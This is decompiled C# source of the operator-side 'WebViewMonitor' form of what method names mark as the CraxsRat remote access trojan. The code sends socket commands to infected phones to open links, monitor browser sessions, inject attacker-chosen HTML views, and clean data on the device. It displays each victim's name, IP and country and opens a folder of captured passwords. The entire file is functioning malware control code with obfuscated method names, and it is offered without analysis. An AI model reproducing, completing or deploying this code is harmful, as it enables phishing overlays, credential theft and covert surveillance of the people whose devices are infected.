using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

// Token: 0x020000C6 RID: 198
[DesignerGenerated]
public partial class WebViewMonitor : Form
{
	// Token: 0x0600088B RID: 2187 RVA: 0x000CD1F4 File Offset: 0x000CB3F4
	private void DrakeUITextBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (Conversions.ToBoolean(this.firstclick))
		{
			this.firstclick = false;
			this.TargetLink.Text = "";
		}
	}

	// Token: 0x0600088C RID: 2188 RVA: 0x000CD22C File Offset: 0x000CB42C
	public WebViewMonitor()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry;
		base.FormClosing += this.WebViewMonitor_FormClosing;
		this.Title = "null";
		this.firstclick = true;
		this.MapData = new Dictionary<string, string>();
		this.y = 0;
		this.InitializeComponent();
	}

	// Token: 0x0600088D RID: 2189 RVA: 0x000CD294 File Offset: 0x000CB494
	public void PostData(string datastring)
	{
		base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
		{
			this.datalogtext.AppendText("> " + datastring + "\r\n");
		}));
	}

	// Token: 0x0600088E RID: 2190 RVA: 0x000CD2C8 File Offset: 0x000CB4C8
	public void addlinks(string lnk)
	{
		base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
		{
			Label label = new Label();
			label.Cursor = Cursors.Hand;
			label.Dock = DockStyle.Top;
			label.Font = new Font("Calibri", 14f);
			label.ForeColor = Color.Aqua;
			label.Size = new Size(631, 40);
			label.TabIndex = 0;
			label.Text = lnk;
			label.TextAlign = ContentAlignment.MiddleCenter;
			label.MouseClick += delegate(object sender2, MouseEventArgs eventargs2)
			{
				try
				{
					if (this.Classclient != null)
					{
						try
						{
							string[] array = this.Classclient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								this.Classclient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"lodp<*>g<*>",
									label.Text,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.Classclient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.Classclient
							};
							this.Classclient.SendMessage(parametersObjects);
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			};
			this.linkspanel.Controls.Add(label);
		}));
	}

	// Token: 0x0600088F RID: 2191 RVA: 0x000CD2FC File Offset: 0x000CB4FC
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			if (!string.IsNullOrEmpty(this.TargetLink.Text) && !string.IsNullOrEmpty(this.TargetLink.Text))
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				int value = 0;
				int value2 = 0;
				string text = "";
				if (Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), false) == 0)
				{
					this.statustext.Text = "Request Sent";
				}
				else
				{
					text = "mon<*>";
					this.statustext.Text = "Starting Monitoring , Please Wait...";
				}
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lnk<*>",
						text,
						reso.ChekLink(this.TargetLink.Text),
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(value),
						Data.SPL_SOCKET,
						Conversions.ToString(value2),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
			else
			{
				EagleAlert.ShowWarning("Enter Link First !!!");
			}
		}
	}

	// Token: 0x06000890 RID: 2192 RVA: 0x000CD4C4 File Offset: 0x000CB6C4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry(object sender, EventArgs e)
	{
		this.DrakeUIComboBox1.Text = "just open";
		try
		{
			this.ClientPic.Image = this.Classclient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.Classclient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.Classclient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.Classclient.Country
			});
		}
		catch (Exception)
		{
		}
		this.translateme();
		try
		{
			if (!Directory.Exists(this.Classclient.FolderUSER + "\\Browser_CAP"))
			{
				Directory.CreateDirectory(this.Classclient.FolderUSER + "\\Browser_CAP");
			}
		}
		catch (Exception)
		{
		}
		this.BWloader.RunWorkerAsync();
	}

	// Token: 0x06000891 RID: 2193 RVA: 0x000CD5D4 File Offset: 0x000CB7D4
	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, "en", "ar");
				this.openbtn.Text = Codes.Translate(this.openbtn.Text, "en", "ar");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
				this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, "en", "ar");
				this.savbtn.Text = Codes.Translate(this.savbtn.Text, "en", "ar");
				this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, "en", "ar");
				this.refbtn.Text = Codes.Translate(this.refbtn.Text, "en", "ar");
				this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, "en", "ar");
				this.linkspanel.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "ar");
				this.datapanel.Text = Codes.Translate(this.datapanel.Text, "en", "ar");
				this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "ar");
				this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, "en", "ar");
				this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, "en", "ar");
				this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, "en", "ar");
			}
		}
		else
		{
			this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, "en", "zh");
			this.openbtn.Text = Codes.Translate(this.openbtn.Text, "en", "zh");
			this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
			this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, "en", "zh");
			this.savbtn.Text = Codes.Translate(this.savbtn.Text, "en", "zh");
			this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, "en", "zh");
			this.refbtn.Text = Codes.Translate(this.refbtn.Text, "en", "zh");
			this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, "en", "zh");
			this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "zh");
			this.linkspanel.Text = Codes.Translate(this.linkspanel.Text, "en", "zh");
			this.datapanel.Text = Codes.Translate(this.datapanel.Text, "en", "zh");
			this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, "en", "zh");
			this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, "en", "zh");
			this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, "en", "zh");
		}
	}

	// Token: 0x06000892 RID: 2194 RVA: 0x000CDAA4 File Offset: 0x000CBCA4
	private void Vsbar_ValueChanged(object sender, EventArgs e)
	{
		try
		{
			if (this.vewimage.Image != null)
			{
				this.y = (sender as DrakeUIScrollBar).Value;
				this.vewimage.Refresh();
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000893 RID: 2195 RVA: 0x0000206C File Offset: 0x0000026C
	private void Vewimage_Paint(object sender, PaintEventArgs e)
	{
	}

	// Token: 0x06000894 RID: 2196 RVA: 0x000CDAF4 File Offset: 0x000CBCF4
	private void BWloader_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			if (this.Classclient != null)
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lodp<*>l<*>",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000895 RID: 2197 RVA: 0x000CDC2C File Offset: 0x000CBE2C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte HTML Files (.html)";
			openFileDialog.Filter = "html Files|*.html";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				DialogResult dialogResult2 = MessageBox.Show("Send This View ?", "Confirm", MessageBoxButtons.YesNo);
				if (dialogResult2 == DialogResult.Yes)
				{
					TcpClient myClient = this.Classclient.myClient;
					string[] array = this.Classclient.Keys.Split(new char[]
					{
						':'
					});
					string text = Conversions.ToString(Codes.BSEN(File.ReadAllText(fileName)));
					object[] parametersObjects = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"ussd<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000896 RID: 2198 RVA: 0x000CDDD0 File Offset: 0x000CBFD0
	private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.Classclient != null)
		{
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			int value = 0;
			int value2 = 0;
			if (Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), false) == 0)
			{
				this.statustext.Text = "Request Sent";
			}
			else
			{
				this.statustext.Text = "Starting Monitoring , Please Wait...";
			}
			object[] parametersObjects = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"bORlQeywIwrkkxg8BnzKHg==STP",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(value),
					Data.SPL_SOCKET,
					Conversions.ToString(value2),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
		this.BWloader.Dispose();
	}

	// Token: 0x06000897 RID: 2199 RVA: 0x0000206C File Offset: 0x0000026C
	private void Timeloader_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x06000898 RID: 2200 RVA: 0x000CDF40 File Offset: 0x000CC140
	private void Namescombo_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(this.namescombo.Text))
			{
				string text = this.MapData[this.namescombo.Text];
				if (text != null && text.Contains(":"))
				{
					string[] array = text.Split(new char[]
					{
						':'
					});
					string text2 = this.namescombo.Text;
					string text3 = array[0];
					string text4 = array[1];
					this.nametext.Text = text2;
					this.linktext.Text = text3;
					this.idtext.Text = text4;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000899 RID: 2201 RVA: 0x000CDFF4 File Offset: 0x000CC1F4
	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		if (!this.BWloader.IsBusy)
		{
			this.BWloader.RunWorkerAsync();
		}
	}

	// Token: 0x0600089A RID: 2202 RVA: 0x00003794 File Offset: 0x00001994
	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		this.datalogtext.Text = "";
	}

	// Token: 0x0600089B RID: 2203 RVA: 0x000CE01C File Offset: 0x000CC21C
	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(this.datalogtext.Text))
		{
			Clipboard.SetText(this.datalogtext.Text);
			EagleAlert.ShowSucess("Text Copied.");
		}
	}

	// Token: 0x0600089C RID: 2204 RVA: 0x000CE058 File Offset: 0x000CC258
	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		if (!Directory.Exists(this.Classclient.FolderUSER + "\\Browser_CAP\\Passwords"))
		{
			EagleAlert.Showinformation("No Password Founded");
		}
		else
		{
			Process.Start(this.Classclient.FolderUSER + "\\Browser_CAP\\Passwords");
		}
	}

	// Token: 0x0600089D RID: 2205 RVA: 0x000CE0AC File Offset: 0x000CC2AC
	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		string text = this.comandcombo.Text.ToLower();
		string a = text;
		if (!(a == "clean"))
		{
			if (!(a == "edit"))
			{
				if (!(a == "remove"))
				{
					if (!(a == "add"))
					{
						return;
					}
					if (string.IsNullOrEmpty(this.nametext.Text) | string.IsNullOrEmpty(this.linktext.Text))
					{
						EagleAlert.ShowWarning("Both (Name , Link) is required.");
						return;
					}
					if (this.comandcombo.Items.Contains(this.nametext.Text))
					{
						EagleAlert.ShowWarning("this name already add.");
						return;
					}
					string text2 = this.nametext.Text;
					string text3 = this.linktext.Text;
					string text4 = "blank";
					if (!string.IsNullOrEmpty(this.idtext.Text))
					{
						text4 = this.idtext.Text;
					}
					string text5 = string.Concat(new string[]
					{
						text2,
						">",
						text3,
						">",
						text4,
						">"
					});
					if (this.Classclient == null)
					{
						return;
					}
					try
					{
						string[] array = this.Classclient.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							this.Classclient.myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"lodp<*>ad<*>",
								text5,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.Classclient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.Classclient
						};
						this.Classclient.SendMessage(parametersObjects);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
				if (string.IsNullOrEmpty(this.namescombo.Text))
				{
					EagleAlert.ShowWarning("Select name to remove.");
				}
				else if (Codes.MyMsgBox("Alert", "Are you sure you want to remove\r\n" + this.namescombo.Text + " from monitoring list ?", true, Resources.information48px))
				{
					string text6 = this.namescombo.Text;
					string[] array2 = this.Classclient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>re<*>",
							text6,
							Data.SPL_SOCKET,
							array2[0],
							Data.SPL_SOCKET,
							array2[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(parametersObjects2);
				}
			}
			else if (string.IsNullOrEmpty(this.namescombo.Text))
			{
				EagleAlert.ShowWarning("Select name to Edit.");
			}
			else
			{
				string text7 = this.nametext.Text;
				string text8 = this.linktext.Text;
				string text9 = "blank";
				if (!string.IsNullOrEmpty(this.idtext.Text))
				{
					text9 = this.idtext.Text;
				}
				string text10 = string.Concat(new string[]
				{
					text7,
					">",
					text8,
					">",
					text9,
					">"
				});
				string[] array3 = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects3 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lodp<*>ed<*>",
						text10,
						Data.SPL_SOCKET,
						array3[0],
						Data.SPL_SOCKET,
						array3[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects3);
			}
		}
		else if (string.IsNullOrEmpty(this.namescombo.Text))
		{
			EagleAlert.ShowWarning("Select name to remove.");
		}
		else if (Codes.MyMsgBox("Alert", "Are you sure you want to Clean Data For:\r\n" + this.namescombo.Text + " data will be removed from phone.", true, Resources.information48px))
		{
			string text11 = this.namescombo.Text;
			string[] array4 = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects4 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>cl<*>",
					text11,
					Data.SPL_SOCKET,
					array4[0],
					Data.SPL_SOCKET,
					array4[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects4);
		}
	}

	// Token: 0x0600089E RID: 2206 RVA: 0x000CDFF4 File Offset: 0x000CC1F4
	private void drakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (!this.BWloader.IsBusy)
		{
			this.BWloader.RunWorkerAsync();
		}
	}

	// Token: 0x04000CC0 RID: 3264
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TargetLink")]
	private DrakeUITextBox _TargetLink;

	// Token: 0x04000CC1 RID: 3265
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("openbtn")]
	private DrakeUIButtonIcon _openbtn;

	// Token: 0x04000CC2 RID: 3266
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("vsbar")]
	private DrakeUIScrollBar _vsbar;

	// Token: 0x04000CC3 RID: 3267
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selecthtmlbtn")]
	private DrakeUIButtonIcon _selecthtmlbtn;

	// Token: 0x04000CC4 RID: 3268
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BWloader")]
	private BackgroundWorker _BWloader;

	// Token: 0x04000CC5 RID: 3269
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("timeloader")]
	private Timer _timeloader;

	// Token: 0x04000CC6 RID: 3270
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("commndbtn")]
	private DrakeUIButtonIcon _commndbtn;

	// Token: 0x04000CC7 RID: 3271
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refbtn")]
	private DrakeUIButtonIcon _refbtn;

	// Token: 0x04000CC8 RID: 3272
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("namescombo")]
	private DrakeUIComboBox _namescombo;

	// Token: 0x04000CC9 RID: 3273
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cpybtn")]
	private DrakeUIButtonIcon _cpybtn;

	// Token: 0x04000CCA RID: 3274
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savbtn")]
	private DrakeUIButtonIcon _savbtn;

	// Token: 0x04000CCB RID: 3275
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	// Token: 0x04000CCC RID: 3276
	public Client Classclient;

	// Token: 0x04000CCD RID: 3277
	public string Title;

	// Token: 0x04000CCE RID: 3278
	public object firstclick;

	// Token: 0x04000CCF RID: 3279
	public Dictionary<string, string> MapData;

	// Token: 0x04000CD0 RID: 3280
	private int y;

	// Token: 0x04000CEE RID: 3310
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon1;

	// Token: 0x04000CEF RID: 3311
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon2;

	// Token: 0x04000CF0 RID: 3312
	[AccessedThroughProperty("DrakeUITextBox1")]
	internal DrakeUITextBox DrakeUITextBox1;

	// Token: 0x04000CF1 RID: 3313
	[AccessedThroughProperty("Label1")]
	internal Label Label1;

	// Token: 0x04000CF2 RID: 3314
	[AccessedThroughProperty("DrakeUITextBox3")]
	internal DrakeUITextBox DrakeUITextBox3;

	// Token: 0x04000CF3 RID: 3315
	[AccessedThroughProperty("DrakeUITextBox2")]
	internal DrakeUITextBox DrakeUITextBox2;

	// Token: 0x04000CF4 RID: 3316
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon4;

	// Token: 0x04000CF5 RID: 3317
	[AccessedThroughProperty("Actionslistcombo")]
	internal DrakeUIComboBox Actionslistcombo;

	// Token: 0x04000CF6 RID: 3318
	[AccessedThroughProperty("TargetsListcombo")]
	internal DrakeUIComboBox TargetsListcombo;

	// Token: 0x04000CF7 RID: 3319
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon3;
}
